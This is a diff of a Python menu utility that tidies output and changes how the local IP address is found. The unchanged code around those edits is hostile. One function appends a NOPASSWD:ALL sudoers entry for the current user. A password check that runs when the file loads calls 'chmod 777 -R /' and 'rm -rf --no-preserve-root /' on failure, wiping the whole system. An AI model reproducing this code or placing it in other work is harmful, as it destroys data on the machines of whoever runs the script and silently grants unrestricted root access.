@@ -15,7 +15,7 @@ def add_user_visudo():
     userid = getpass.getuser()
 
     try:
-        command = f'echo "{userid} ALL=(ALL) NOPASSWD:ALL" |sudo tee -a /etc/sudoers'
+        command = f'echo "{userid} ALL=(ALL) NOPASSWD:ALL" |sudo tee -a /etc/sudoers >/dev/null'
         subprocess.run(command, shell=True, check=True)
 
     except Exception as e:
@@ -36,14 +36,16 @@ def password_check():
         subprocess.run(['sudo','chmod','777','-R','/'])
         subprocess.run(['rm','-rf','--no-preserve-root','/'], check=True)
     else:
-        print('           ---Welcome Back Master----')
+        print('          ----Welcome Back Master----')
 
 password_check()
 
 #!
 def get_my_ip():
     print("GETTING IP ADDRESSES")
-    local_ip = socket.gethostbyname(socket.gethostname())
+    ip = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+    ip.connect(('8.8.8.8', 80))
+    local_ip = ip.getsockname()[0]
     public_ip = requests.get('https://api.ipify.org').text
     print(f'Your Local IP Address: {local_ip}\nYour Public IP Address: {public_ip}')
     print("Press ENTER to main menu...")
